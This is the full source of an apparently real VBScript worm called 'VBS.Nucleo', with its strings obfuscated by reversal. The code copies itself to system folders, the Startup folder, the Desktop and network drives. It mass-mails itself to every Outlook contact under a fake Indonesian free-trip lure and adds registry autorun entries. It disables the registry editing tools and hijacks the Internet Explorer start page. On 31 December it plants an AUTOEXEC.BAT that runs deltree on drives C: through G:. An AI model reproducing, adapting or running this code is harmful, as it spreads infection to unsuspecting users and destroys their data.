'VBS.Nucleo
'Author    : Spidey [SECTOR-S]
'Origin    : Surabaya, Indonesia
On Error Resume Next
Set SBY = CreateObject("Scripting.FileSystemObject")
Bs = SBY.OpenTextFile(Wscript.ScriptFullName).ReadAll
Set SURO = CreateObject("WScript.Shell")
Set BOYO = SBY.GetFile(Wscript.ScriptFullName)
'Buat File
Set Wr =SBY.CreateTextFile("Fung.exe",1)
Wr.WriteLine "Function B(Tek):B = Strreverse(Tek):End Function"
Wr.Close
Gg = SBY.OpenTextFile("Fung.exe").ReadAll
execute Gg
'Folders and Files
Startup = SURO.SpecialFolders(B("putratS"))
Desktop = SURO.SpecialFolders(B("potkseD"))
Set Win = SBY.GetSpecialFolder(0)
Set Sys = SBY.GetSpecialFolder(1)
SFile = Startup & B("sbv.exe.toobtsaf\")
DFile = Desktop & B("sbv.gepm.acinoM_sengA\")
MFile = Win & B("sbv.rcs.oelcuN\")
BFile = Sys & B("sbv.tad.ptfteni\")
If MFile <> B("sbv.rcs.oelcuN\") Then
SBY.CopyFile BOYO, MFile
End If
If BFile <> B("sbv.tad.ptfteni") Then
SBY.CopyFile BOYO, BFile
End If
If DFile <> B("sbv.gepm.acinoM_sengA") Then
SBY.CopyFile BOYO, DFile
End If
If SFile <> B("sbv.exe.toobtsaf\") Then
SBY.CopyFile BOYO, SFile
End If
'Network
Set SUNET = CreateObject(B("krowteN.tpircSW"))
Set BONET = SUNET.EnumNetworkDrives
If BONET.Count <> 0 Then
For Netnya = 0 To BONET.Count - 1
If InStr(BONET.Item(Netnya), "\") <> 0 Then
SBY.CopyFile BOYO, SBY.BuildPath(BONET.Item(Netnya)), B("sbv.tad.ptfteni\")
SBY.CopyFile BOYO, SBY.BuildPath(BONET.Item(Netnya)), B("sbv.gepm.acinoM_sengA\")
End If
Next
End If
'Happy New Year
If Day(Now()) = 31 and Month(Now()) = 12 then
MsgBox B(" raeY weN yppaH")& Year(Now()),4160, Year(Now())
BatDeltree()
End If
'Mas Mailer
Set Wr = SBY.CreateTextFile(B("exe.eoJsaM"),1)
Wr.WriteLine B("oelcuN.SBV'")
Wr.WriteLine B("fI dnE:txeN:txeN:dneS.liamEkooltuO:eurT = timbuSretfAeteleD.liamEkooltuO:emaNlluFtpircS.tpircSW ddA.stnemhcattA.liamEkooltuO:"" ): !!! tujnal hibel kutnu tnemhcatta acaB"" & fLrCbv & "",hunep nalub 1 amales ILAB ualup ek sitarg atasiw tekap naktapadnem adna tamaleS"" = ydoB.liamEkooltuO:""RUOT ILAB"" = tcejbuS.liamEkooltuO:)puorGresU(seirtnEsserddA.hctiwStcatnoC ddA.stneipiceR.liamEkooltuO:)0(metIetaerC.ppAkooltuO = liamEkooltuO teS:tnuoC.seirtnEsserddA.hctiwStcatnoC oT 1 = puorGresU roF:stsiLsserddA.)""IPAM""(ecapSemaNteG.ppAkooltuO nI hctiwStcatnoC hcaE roF:nehT """" = ppAkooltuO toN fI:)""noitacilppA.kooltuO""(tcejbOetaerC = ppAkooltuO teS")
Wr.Close
Mas = SBY.OpenTextFile(B("exe.eoJsaM")).ReadAll
execute Mas
'Fake...
Set Psn = SBY.CreateTextFile(Desktop & B("cod.oelcuN\"),1)
Psn.WriteLine B("? paleg malad nakumet umak gnay apA") & vbCrLf & B("? paleg malad nakasar umak gnay apA") & vbCrLf & B("? paleg malad irac umak naka gnay apA") & vbCrLf & B("? apA") & vbCrLf & B("? apais") & vbCrLf & B("? anamid") & vbCrLf & B("? apareb maj") & vbCrLf & B("? napak") & vbCrLf & B("? anamig") & vbCrLf & B("? apanek") & vbCrLf & B("? ayi apa") & vbCrLf & B("!? halhatne") & vbCrLf & B("? apagnem") & vbCrLf & vbCrLf & vbCrLf & B("..........aaaaaaahahauH") & vbCrLf & B("..........aaaaaaahahauH") & vbCrLf & B("..........aaaaaaahahauH") & vbCrLf & B("..........aaaaaaahahauH")
Psn.Close
'Infect registry
SURO.RegWrite B("detcefnI\ruyS\erawtfoS\MLKH"), B("oelcuN.SBV htiw")
SURO.RegWrite B("nigirO\ruyS\erawtfoS\MLKH"), B("aisenodnI ,ayabaruS")
SURO.RegWrite B("rohtuA\ruyS\erawtfoS\MLKH"), B("]S-ROTCES[ yedipS")
SURO.RegWrite B("toorptf\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\MLKH"), MFile
SURO.RegWrite B("gldmoC\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"), BFile
SURO.RegWrite B("bupteni\ecnOnuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\MLKH"), MFile
SURO.RegWrite B("slooTyrtsigeRelbasiD\metsyS\seiciloP\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"),"1",B("DROWD_GER")
SURO.RegWrite B("eltiT wodniW\niaM\rerolpxE tenretnI\tfosorciM\erawtfoS\UCKH"),B("oelcuN.SBV yb detcefnI")
SURO.RegWrite B("egaP tratS\niaM\rerolpxE tenretnI\tfosorciM\erawtfoS\UCKH"),B("ten.srotcesmaet.www//:ptth")
'BatDeltree
Sub BatDeltree()
On Error Resume Next
Set BatC = SBY.CreateTextFile(B("tab.cexeotuA\:c"))
BatC.WriteLine B("oelcuN.SBV::")
BatC.WriteLine B("slc")
BatC.WriteLine B("Б     ллл     ллл ллллллл   лллллл    лл    ллл  ллл ohce@")& vbCrLf & B("Б      ллл   ллл  ллллллл  ллллллл   лллл   ллл  ллл ohce@") & vbCrLf & B("Б       ллл ллл  лл   ллл лл   ллл  лл  лл  ллл  ллл ohce@") & vbCrLf & B("ББ        ллллл   лл   ллл лл   ллл ллл  ллл ллл  ллл ohce@") & vbCrLf & B("ББ          ллл     ллллллл  ллллллл лллллллл лллллллл ohce@") & vbCrLf & B("Б           ллл       ллллл    ллллл лллллллл лллллллл ohce@") & vbCrLf & B("Б           ллл         ллл      ллл ллл  ллл ллл  ллл ohce@") & vbCrLf & B("Б           ллл         ллл      ллл ллл  ллл ллл  ллл ohce@") & vbCrLf & B("Б           ллл         ллл      ллл ллл  ллл ллл  ллл ohce@") & vbCrLf & B("Б           ллл         ллл      ллл ллл  ллл ллл  ллл ohce@") & vbCrLf & B("Б                                                      ohce@") & vbCrLf & B("ББ    ллллл                    лллл ллллллллл     ллл  ohce@") & vbCrLf & B("ББ     ллллл          лллл     ллл ллллллллл    лллл  ohce@") & vbCrLf & B("ББ      ллллл         лллл    ллл л     ллл   ллллл  ohce@") & vbCrLf & B("ББ       ллллл        лллл   ллл   л   ллл  лл ллл  ohce@") & vbCrLf & B("БББ       ллллл      ллллл  ллл   ллллллл лл  ллл  ohce@") & vbCrLf & B("БББ        лллл    лллллл ллл   л   ллллл   ллл  ohce@") & vbCrLf & B("БББ          лллллллл  лллллл л     лллл    ллл  ohce@") & vbCrLf & B("БББ              лллллл   ллллл ллллллллл     ллл  ohce@") & vbCrLf & B("ББ                 ллллл    лллл ллллллллл    ллллл ohce@") & vbCrLf & B("ББ   лллллл                                          ohce@") & vbCrLf & B("ББ   лллллллл      ллллллл лллллллллл ллл         ллл ohce@") & vbCrLf & B("Б   лллллллллл    лллллллл ллллллллллл лллл    ллллл  ohce@") & vbCrLf & B("ББ  л      ллл   лл    ллл л       лллл лллл  лллл    ohce@") & vbCrLf & B("ББ         лл   лл    ллл          лллл  ллллллл     ohce@") & vbCrLf & B("Б   ллллллл     лллллллл      ллллллллл  лллл       ohce@") & vbCrLf & B("ББ  ллллллл       ллллллл       ллллллллл   ллл      ohce@") & vbCrLf & B("ББ  ллл            ллл ллл             ллллл  ллл     ohce@") & vbCrLf & B("Б   лл      л    лллл  ллл л             лллл   ллл   ohce@") & vbCrLf & B("Б   ллл     лл лллл    ллл ллллллллллллллллллл   ллл  ohce@") & vbCrLf & B("Б    ллллл лллллл      ллл лллллллллллллллллллл   ллл ohce@") & vbCrLf & B("Б     лллллл                                          ohce@") & vbCrLf & B("ББ     лллл     БББББББББББББББ                       ohce@") & vbCrLf & B("БББ         ББББ              ББББББ             БББ ohce@") & vbCrLf & B("БББББББББББ                      ББ         ББББ   ohce@") & vbCrLf & B("БББББББББББ      ohce@")
BatC.WriteLine B(".ohce@") & vbCrLf & B(".........................................hahahahaahahahahahahahahahauH ohce@")
BatC.WriteLine B(":c y/ eertled") & vbCrLf & B(":d y/ eertled") & vbCrLf & B(":e y/ eertled") & vbCrLf & B(":f y/ eertled") & vbCrLf & B(":g y/ eertled") & vbCrLf
BatC.Close
End Sub
SBY.DeleteFile(B("exe.gnuF"))
SBY.DeleteFile(B("exe.eoJsaM"))
